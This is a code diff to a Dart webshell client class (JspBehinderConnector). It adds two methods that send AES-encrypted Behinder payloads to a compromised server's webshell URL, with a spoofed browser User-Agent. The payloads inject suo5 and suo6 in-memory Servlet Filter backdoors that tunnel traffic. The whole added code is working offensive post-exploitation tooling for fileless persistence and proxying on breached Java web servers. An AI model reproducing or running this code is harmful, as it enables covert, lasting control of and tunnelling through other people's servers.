@@ -663,4 +663,126 @@ class JspBehinderConnector extends ShellConnector {
     return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
       ..sort();
   }
+
+  /// 向目标注入 suo5 Filter 内存马。
+  ///
+  /// 发送 Suo5FilterInject.class 作为 Behinder payload，
+  /// 服务端加载后通过反射把 suo5 Filter 注册到 Servlet 容器。
+  /// 返回响应体（"OK:<path>" / "OK:ALREADY" / "FAIL" / "ERR:..."）。
+  Future<String> injectSuo5MemShell({
+    String filterName = 's5_mem',
+    String urlPath = '/*',
+  }) async {
+    try {
+      await _ensureSession();
+
+      String b64;
+      try {
+        b64 = (await io.File('data/mem_shell/Suo5FilterInject.b64').readAsString()).trim();
+      } catch (_) {
+        try {
+          b64 = (await rootBundle.loadString('data/mem_shell/Suo5FilterInject.b64')).trim();
+        } catch (_) {
+          return '[Error] Suo5FilterInject.b64 未找到，请重新构建资产';
+        }
+      }
+      b64 = b64.replaceAll(RegExp(r'\s'), '');
+      if (b64.isEmpty) return '[Error] Suo5FilterInject.b64 为空';
+
+      final payloadBytes = Uint8List.fromList(base64.decode(b64));
+      final b64Payload = _aesEncryptBase64(payloadBytes)
+          .replaceAll('\n', '')
+          .replaceAll('\r', '');
+      final bodyBytes = utf8.encode(b64Payload);
+
+      final uri = Uri.parse(webshell.url);
+      final headers = <String, String>{
+        'Content-Type': 'application/octet-stream',
+        'Accept': '*/*',
+        'User-Agent':
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+        'X-S5-Name': filterName,
+        'X-S5-Path': urlPath,
+      };
+      if (_cookies.isNotEmpty) {
+        headers['Cookie'] =
+            _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+      }
+
+      final response = await _client
+          .post(uri, headers: headers, body: bodyBytes)
+          .timeout(const Duration(seconds: 25));
+      _updateCookies(response);
+
+      if (response.statusCode == 200) {
+        return decodeWithFallback(response.bodyBytes).trim();
+      }
+      return '[HTTP ${response.statusCode}]';
+    } on TimeoutException {
+      return '[Timeout] 连接超时';
+    } on http.ClientException catch (e) {
+      return '[Connection Error] ${e.message}';
+    } catch (e) {
+      return '[Error] $e';
+    }
+  }
+
+  /// 发送 Suo6FilterInject.class 作为 Behinder payload，注入二进制多路复用隧道 Filter。
+  Future<String> injectSuo6MemShell({
+    String filterName = 'suo6',
+    String urlPath = '/s6',
+  }) async {
+    try {
+      await _ensureSession();
+
+      String b64;
+      try {
+        b64 = (await io.File('data/mem_shell/Suo6FilterInject.b64').readAsString()).trim();
+      } catch (_) {
+        try {
+          b64 = (await rootBundle.loadString('data/mem_shell/Suo6FilterInject.b64')).trim();
+        } catch (_) {
+          return '[Error] Suo6FilterInject.b64 未找到，请重新构建资产';
+        }
+      }
+      b64 = b64.replaceAll(RegExp(r'\s'), '');
+      if (b64.isEmpty) return '[Error] Suo6FilterInject.b64 为空';
+
+      final payloadBytes = Uint8List.fromList(base64.decode(b64));
+      final b64Payload = _aesEncryptBase64(payloadBytes)
+          .replaceAll('\n', '')
+          .replaceAll('\r', '');
+      final bodyBytes = utf8.encode(b64Payload);
+
+      final uri = Uri.parse(webshell.url);
+      final headers = <String, String>{
+        'Content-Type': 'application/octet-stream',
+        'Accept': '*/*',
+        'User-Agent':
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+        'X-S6-Name': filterName,
+        'X-S6-Path': urlPath,
+      };
+      if (_cookies.isNotEmpty) {
+        headers['Cookie'] =
+            _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
+      }
+
+      final response = await _client
+          .post(uri, headers: headers, body: bodyBytes)
+          .timeout(const Duration(seconds: 25));
+      _updateCookies(response);
+
+      if (response.statusCode == 200) {
+        return decodeWithFallback(response.bodyBytes).trim();
+      }
+      return '[HTTP ${response.statusCode}]';
+    } on TimeoutException {
+      return '[Timeout] 连接超时';
+    } on http.ClientException catch (e) {
+      return '[Connection Error] ${e.message}';
+    } catch (e) {
+      return '[Error] $e';
+    }
+  }
 }
